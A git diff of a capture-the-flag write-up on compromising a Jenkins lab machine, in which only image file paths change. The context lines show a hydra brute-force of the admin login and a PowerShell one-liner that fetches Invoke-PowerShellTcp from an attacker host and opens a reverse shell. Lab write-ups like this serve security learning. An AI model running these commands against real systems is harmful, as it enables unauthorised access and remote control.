@@ -22,27 +22,27 @@ Please note that this machine does not respond to ping (ICMP) and may take a few
 
 ### How many ports are open? (TCP only) <a href="#user-content-how-many-ports-are-open-tcponly" id="user-content-how-many-ports-are-open-tcponly"></a>
 
-<figure><img src="../../.gitbook/assets/Untitled.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/Untitled 1.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 1 (1).png" alt=""><figcaption></figcaption></figure>
 
 ### What is the username and password for the log in panel(in the format username:password) <a href="#user-content-what-is-the-username-and-password-for-the-log-in-panelin-the-format-usernamepassword" id="user-content-what-is-the-username-and-password-for-the-log-in-panelin-the-format-usernamepassword"></a>
 
 Let’s visit the webpage:
 
-<figure><img src="../../.gitbook/assets/Untitled 2.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 2 (1).png" alt=""><figcaption></figcaption></figure>
 
 I’m going to use gobuster to try to discover any accessible directories:
 
 And meanwhile, let’s see the source code of the page:
 
-<figure><img src="../../.gitbook/assets/Untitled 3.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 3 (1).png" alt=""><figcaption></figcaption></figure>
 
 Nothing useful in the source code. No javascripts loaded or cookies stored. Just a plain webpage.
 
 Back to gobuster we can see that it discovered 2 more pages:
 
-<figure><img src="../../.gitbook/assets/Untitled 4.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 4 (1).png" alt=""><figcaption></figcaption></figure>
 
 Let’s see if them are different from the lowercase one:
 
@@ -50,41 +50,41 @@ Yes, those 2 results are the same at the first one, so the server probably is no
 
 So, it makes no sense scanning the server with that wordlist, let’s switch to the lowercase one:
 
-<figure><img src="../../.gitbook/assets/Untitled 5.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 5 (1).png" alt=""><figcaption></figcaption></figure>
 
 Maybe is not a directory or a file, and maybe is a subdomain?
 
 Back to the scan results, I forgot that the port 8080 is also open and running a http-proxy. I’m going to visit it with the web browser:
 
-<figure><img src="../../.gitbook/assets/Untitled 6.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 6 (1).png" alt=""><figcaption></figcaption></figure>
 
 Yep, a login page.
 
 This is the source code:
 
-<figure><img src="../../.gitbook/assets/Untitled 7.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 7 (2).png" alt=""><figcaption></figcaption></figure>
 
 The files it loaded:
 
-<figure><img src="../../.gitbook/assets/Untitled 8.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 8 (1).png" alt=""><figcaption></figcaption></figure>
 
 And the cookie it created:
 
-<figure><img src="../../.gitbook/assets/Untitled 9.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 9 (1).png" alt=""><figcaption></figcaption></figure>
 
 Let’s see what happens when we try to log in with random credentials:
 
-<figure><img src="../../.gitbook/assets/Untitled 10.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 10 (1).png" alt=""><figcaption></figcaption></figure>
 
 A new text appears telling us that the credentials are not correct.
 
 Would the form be vulnerable to SQL injection?
 
-<figure><img src="../../.gitbook/assets/Untitled 11.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 11 (1).png" alt=""><figcaption></figcaption></figure>
 
 It doesn´t look like. Time to bruteforce it? Before that let’s search if Jenkins use a default username and password when installed
 
-<figure><img src="../../.gitbook/assets/Untitled 12.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 12 (1).png" alt=""><figcaption></figcaption></figure>
 
 Yep, according to [this website](https://www.shellhacks.com/jenkins-default-password-username/) Jenkins use admin as default username. The site also says that the password is stored in a file located inside a folder named secrets. Interesting.
 
@@ -104,11 +104,11 @@ hydra -l admin -P /usr/share/wordlists/fasttrack.txt 10.10.169.165 -s 8080 http-
 
 As the port is not the common one, I used the -s flag.
 
-<figure><img src="../../.gitbook/assets/Untitled 14.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 14 (1).png" alt=""><figcaption></figcaption></figure>
 
 After a few minutes hydra discovers the password. Let’s use it to try to log in and see if it’s correct:
 
-<figure><img src="../../.gitbook/assets/Untitled 15.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 15 (1).png" alt=""><figcaption></figcaption></figure>
 
 Yeah it’s correct.
 
@@ -118,21 +118,21 @@ Yeah it’s correct.
 
 Under the Configure Project menu I found this:
 
-<figure><img src="../../.gitbook/assets/Untitled 16.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 16 (1).png" alt=""><figcaption></figcaption></figure>
 
 It looks like I’m able to execute code in the mathine after Jenkins builds the machine. Interesting. Let’s see if we can exploit this feature ad the room explains it.
 
 First of all let’s download the powershell scripts, open a python http server and a netcat listener in our machine:
 
-<figure><img src="../../.gitbook/assets/Untitled 17.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 17 (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/Untitled 18.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 18 (1).png" alt=""><figcaption></figcaption></figure>
 
 And now let’s use the script to invocate the powershell:
 
 `powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 1234`
 
-<figure><img src="../../.gitbook/assets/Untitled 19.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 19 (1).png" alt=""><figcaption></figcaption></figure>
 
 After saving the configuration, we have to build the project, I think it’s done by using the Build Now button of the menu:
 
